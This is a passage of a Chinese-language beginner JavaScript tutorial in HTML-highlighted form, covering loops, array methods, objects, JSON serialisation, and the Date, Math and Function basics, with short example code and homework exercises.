class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (count&lt;<span class="hljs-number">10</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>for循环</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-comment">// 循环三要素</span><br><span class="hljs-keyword">for</span>(<span class="hljs-number">1.</span>声明循环的开始; <span class="hljs-number">2.</span>条件; <span class="hljs-number">4.</span> 循环的计数)&#123;<br>   <span class="hljs-comment">// 3. 循环条件为true的时候,会执行这里的代码</span><br>&#125;<br><br><span class="hljs-keyword">for</span>(循环的成员下标 <span class="hljs-keyword">in</span> 被循环的数据)&#123;<br>   <span class="hljs-comment">// 当被循环的数据一直没有执行到最后下标,都会不断执行这里的代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>循环案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 方式1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i)<br>&#125;<br><br><span class="hljs-comment">// 方式2</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">111</span>,<span class="hljs-number">222</span>,<span class="hljs-number">333</span>]<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> arr)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i,arr[i])<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>退出循环（break和continue）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>          <span class="hljs-keyword">if</span> (i===<span class="hljs-number">88</span>)&#123;<br>              <span class="hljs-keyword">continue</span>  <span class="hljs-comment">// 退出当次循环</span><br>              <span class="hljs-comment">// break  // 退出当前整个循环</span><br>          &#125;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i)<br>      &#125;<br></code></pre></td></tr></table></figure><blockquote><p>作业：</p><p>（1）计算1+2+3+…+100&#x3D;？</p><p>（2）求20的阶乘值</p></blockquote><p><a name="3d616341"></a></p><h2 id="4-7、数组对象"><a href="#4-7、数组对象" class="headerlink" title="4.7、数组对象"></a>4.7、数组对象</h2><ul><li>创建数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">创建方式<span class="hljs-number">1</span>:<br><span class="hljs-keyword">var</span> arrname = [元素<span class="hljs-number">0</span>,元素<span class="hljs-number">1</span>,….];          <span class="hljs-comment">// var arr=[1,2,3];</span><br><br>创建方式<span class="hljs-number">2</span>:<br><span class="hljs-keyword">var</span> arrname = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(元素<span class="hljs-number">0</span>,元素<span class="hljs-number">1</span>,….); <span class="hljs-comment">// var test=new Array(100,&quot;a&quot;,true);</span><br></code></pre></td></tr></table></figure><ul><li>数组方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> arr = [<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>];<br><span class="hljs-comment">// 内置属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( arr.<span class="hljs-property">length</span> );<br><span class="hljs-comment">// 获取指定下标的成员</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( arr[<span class="hljs-number">3</span>] ); <span class="hljs-comment">// D</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( arr[arr.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>] ); <span class="hljs-comment">// 最后一个成员</span><br><br><span class="hljs-comment">// (1) pop()  出栈,删除最后一个成员作为返回值</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><span class="hljs-keyword">var</span> ret = arr.<span class="hljs-title function_">pop</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [1, 2, 3, 4]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret); <span class="hljs-comment">// 5</span><br><br><br><span class="hljs-comment">// (2) push() 入栈,给数组后面追加成员</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br>arr.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [1, 2, 3, 4, 5, &quot;a&quot;]</span><br><br><br><span class="hljs-comment">// (3) shift是将数组的第一个元素删除</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br>arr.<span class="hljs-title function_">shift</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [2, 3, 4, 5]</span><br><br><span class="hljs-comment">// (4) unshift是将value值插入到数组的开始</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br>arr.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">&quot;yuan&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [&quot;yuan&quot;,1,2, 3, 4, 5]</span><br><br><br><span class="hljs-comment">// (5) reverse() 反转排列</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br>arr.<span class="hljs-title function_">reverse</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [5, 4, 3, 2, 1]</span><br><br><span class="hljs-comment">// (6) slice(开始下标,结束下标)  切片,开区间</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>));<br><br><br><span class="hljs-comment">// (7) concat() 把2个或者多个数组合并</span><br><span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br><span class="hljs-keyword">var</span> arr2 = [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>];<br><span class="hljs-keyword">var</span> ret = arr1.<span class="hljs-title function_">concat</span>(arr2);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( ret );<br><br><br><span class="hljs-comment">// (8) join()  把数组的每一个成员按照指定的符号进行拼接成字符串</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;广东-深圳-南山&quot;</span>;<br><span class="hljs-keyword">var</span> arr = str.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;-&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( arr ); <span class="hljs-comment">// [&quot;广东&quot;, &quot;深圳&quot;, &quot;南山&quot;];</span><br><br><span class="hljs-keyword">var</span> arr1 = [<span class="hljs-string">&quot;广东&quot;</span>, <span class="hljs-string">&quot;深圳&quot;</span>, <span class="hljs-string">&quot;南山&quot;</span>];<br><span class="hljs-keyword">var</span> str1 = arr1.<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;-&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( str1 ); <span class="hljs-comment">// 广东-深圳-南山</span><br></code></pre></td></tr></table></figure><ul><li>遍历数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>]<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> arr)&#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i,arr[i])<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="48805924"></a></p><h2 id="4-8、Object对象"><a href="#4-8、Object对象" class="headerlink" title="4.8、Object对象"></a>4.8、Object对象</h2><p><a name="6939b9fb"></a></p><h3 id="8-1、object对象的基本操作"><a href="#8-1、object对象的基本操作" class="headerlink" title="8.1、object对象的基本操作"></a>8.1、object对象的基本操作</h3><p>Object 的实例不具备多少功能，但对于在应用程序中存储和传输数据而言，它们确实是非常理想的选择。<br><code>创建 Object 实例的方式有两种。</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;alvin&quot;</span>;<br>person.<span class="hljs-property">age</span> = <span class="hljs-number">18</span>;<br></code></pre></td></tr></table></figure><p><code>另一种方式是使用对象字面量表示法。</code>对象字面量是对象定义的一种简写形式，目的在于简化创建包含大量属性的对象的过程。下面这个例子就使用了对象字面量语法定义了与前面那个例子中相同的person 对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person = &#123;<br>                name : <span class="hljs-string">&quot;alvin&quot;</span>,<br>                age : <span class="hljs-number">18</span>,<br>  <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                      <span class="hljs-title function_">alert</span>(<span class="hljs-number">123</span>);<br>                  &#125;<br>             &#125;;<br></code></pre></td></tr></table></figure><ul><li>object可以通过. 和 []来访问。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&quot;age&quot;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">age</span>)<br></code></pre></td></tr></table></figure><ul><li>object可以通过for循环遍历</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> person)&#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(attr,person[attr]);<br>     &#125;<br></code></pre></td></tr></table></figure><ul><li>或者： </li><li></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">People</span>(<span class="hljs-params">name, age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>, <span class="hljs-string">&quot;在吃东西&quot;</span>)<br>    &#125;<br>&#125;<br>p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;alex&quot;</span>, <span class="hljs-number">18</span>);<br>p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;wusir&quot;</span>, <span class="hljs-number">20</span>);<br>p1.<span class="hljs-title function_">chi</span>();<br>p2.<span class="hljs-title function_">chi</span>();<br></code></pre></td></tr></table></figure><p>- </p><p><a name="e893a8de"></a></p><h3 id="8-2、json序列化和反序列化"><a href="#8-2、json序列化和反序列化" class="headerlink" title="8.2、json序列化和反序列化"></a>8.2、json序列化和反序列化</h3><p><code>JSON</code>：JavaScript 对象表示法，是一种轻量级的数据交换格式。易于人阅读和编写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// json是一种数据格式, 语法一般是&#123;&#125;或者[]包含起来</span><br><span class="hljs-comment">// 内部成员以英文逗号隔开,最后一个成员不能使用逗号!</span><br><span class="hljs-comment">// 可以是键值对,也可以是列表成员</span><br><span class="hljs-comment">// json中的成员如果是键值对,则键名必须是字符串.而json中的字符串必须使用双引号圈起来</span><br><span class="hljs-comment">// json数据也可以保存到文件中,一般以&quot;.json&quot;结尾.</span><br><br><br>&#123;<br>   <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;xiaoming&quot;</span>,<br> <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">12</span><br>&#125;<br><br>[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><br>&#123;<br>   <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;xiaoming&quot;</span>,<br> <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">22</span>,<br>   <span class="hljs-string">&quot;sex&quot;</span>: <span class="hljs-literal">true</span>,<br>   <span class="hljs-string">&quot;son&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;xiaohuihui&quot;</span>,<br>      <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">2</span><br>   &#125;,<br>   <span class="hljs-string">&quot;lve&quot;</span>: [<span class="hljs-string">&quot;篮球&quot;</span>,<span class="hljs-string">&quot;唱&quot;</span>,<span class="hljs-string">&quot;跳&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>js中也支持序列化和反序列化的方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// js对象,因为这种声明的对象格式很像json,所以也叫json对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> data = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;xiaoming&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-number">123</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 把对象转换成json字符串</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> ret = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret ); <span class="hljs-comment">// &#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:22&#125;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 把json字符串转换成json对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-string">`&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:22&#125;`</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> ret = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(str);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ret);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="4dc40070"></a></p><h2 id="4-9、Date对象"><a href="#4-9、Date对象" class="headerlink" title="4.9、Date对象"></a>4.9、Date对象</h2><ul><li>创建Date对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//方法1：不指定参数</span><br><span class="hljs-keyword">var</span> nowd1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">//获取当前时间</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nowd1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nowd1.<span class="hljs-title function_">toLocaleString</span>( ));<br><span class="hljs-comment">//方法2：参数为日期字符串</span><br><span class="hljs-keyword">var</span> d2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&quot;2004/3/20 11:12&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d2.<span class="hljs-title function_">toLocaleString</span>( ));<br><span class="hljs-keyword">var</span> d3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&quot;04/03/20 11:12&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d3.<span class="hljs-title function_">toLocaleString</span>( ));<br></code></pre></td></tr></table></figure><ul><li>获取时间信息</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">获取日期和时间<br>getDate()                 获取日<br>getDay ()                 获取星期<br>getMonth ()               获取月（<span class="hljs-number">0</span>-<span class="hljs-number">11</span>）<br>getFullYear ()            获取完整年份<br>getHours ()               获取小时<br>getMinutes ()             获取分钟<br>getSeconds ()             获取秒<br>getMilliseconds ()        获取毫秒<br></code></pre></td></tr></table></figure><p><a name="c1aff502"></a></p><h2 id="4-10、Math对象"><a href="#4-10、Math对象" class="headerlink" title="4.10、Math对象"></a>4.10、Math对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Math对象的内置方法</span><br><span class="hljs-comment">// abs(x)  返回数值的绝对值</span><br><span class="hljs-keyword">var</span> num = -<span class="hljs-number">10</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(num) ); <span class="hljs-comment">// 10</span><br><br><span class="hljs-comment">// ceil(x)  向上取整</span><br><span class="hljs-keyword">var</span> num = <span class="hljs-number">10.3</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(num) ); <span class="hljs-comment">// 11</span><br><br><span class="hljs-comment">// floor(x) 向下取整</span><br><span class="hljs-keyword">var</span> num = <span class="hljs-number">10.3</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(num) ); <span class="hljs-comment">// 10</span><br><br><span class="hljs-comment">// max(x,y,z,...,n)</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">3</span>,<span class="hljs-number">56</span>,<span class="hljs-number">3</span>) ); <span class="hljs-comment">// 56</span><br><span class="hljs-comment">// min(x,y,z,...,n)</span><br><br><br><span class="hljs-comment">// random()  生成0-1随机数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() );<br><br><span class="hljs-comment">// 生成0-10之间的数值</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10</span> );<br><br><span class="hljs-comment">// round(x) 四舍五入</span><br><span class="hljs-comment">// 生成0-10之间的整数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>( <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10</span> ) );<br></code></pre></td></tr></table></figure><p><a name="a9452a09"></a></p><h2 id="4-11、Function-对象"><a href="#4-11、Function-对象" class="headerlink" title="4.11、Function 对象"></a>4.11、Function 对象</h2><p>函数在程序中代表的就是一段具有功能性的代码，可以让我们的程序编程更加具有结构性和提升程序的复用性,也能让代码变得更加灵活强大</p><p><a name="857ed1e7"></a></p><h3 id="4-11-1、声明函数"><a href="#4-11-1、声明函数" class="headerlink" title="4.11.1、声明函数"></a>4.11.1、声明函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">// 函数的定义方式1</span><br><span class="hljs-comment">function 函数名 (参数)&#123;</span><br><span class="hljs-comment">    函数体;</span><br><span class="hljs-comment">    return 返回值;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">功能说明：</span><br><span class="hljs-comment">    可以使用变量、常量或表达式作为函数调用的参数</span><br><span class="hljs-comment">    函数由关键字function定义</span><br><span class="hljs-comment">    函数名的定义规则与标识符一致，大小写是敏感的</span><br><span class="hljs-comment">    返回值必须使用return</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">//  函数的定义方式2</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">用 Function 类直接创建函数的语法如下：</span><br><span class="hljs-comment">var 函数名 = new Function(&quot;参数1&quot;,&quot;参数n&quot;,&quot;function_body&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">虽然由于字符串的关系，第二种形式写起来有些困难，但有助于理解函数只不过是一种引用类型*/</span><br></code></pre></td></tr></table></figure><p><a name="5674a49f"></a></p><h3 id="4-11-2、函数调用"><a href="#4-11-2、函数调用" class="headerlink" title="4.11.2、函数调用"></a>4.11.2、函数调用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//f(); ---&gt;OK</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span 